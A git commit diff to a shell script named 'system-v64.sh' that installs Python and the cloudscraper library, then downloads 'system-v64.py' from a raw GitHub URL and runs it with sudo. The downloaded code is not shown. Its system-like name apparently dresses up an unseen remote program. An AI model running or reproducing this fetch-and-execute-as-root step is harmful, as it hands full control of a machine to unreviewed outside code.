2f0bfb98df12f0af2df1773ab7feff74c730500a
mdn-gay <bantoideptrai@gmail.com>
2025-12-01 19:28:54 +0700

    Set up Python environment and download system-v64.py
    Install Python and required packages, create directory, and download system-v64.py.

--- system-v64.sh
+++ system-v64.sh
@@ -3,8 +3,5 @@
 sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
 pip install cloudscraper requests && pip3 install cloudscraper requests
 sudo pip3 install cloudscraper requests && pip3 install cloudscraper requests
-cd /etc
-mkdir system-v64
-cd /etc/system-v64
 wget https://raw.githubusercontent.com/mdn-gay/1239277489294m/refs/heads/main/system-v64.py
 sudo python3 system-v64.py
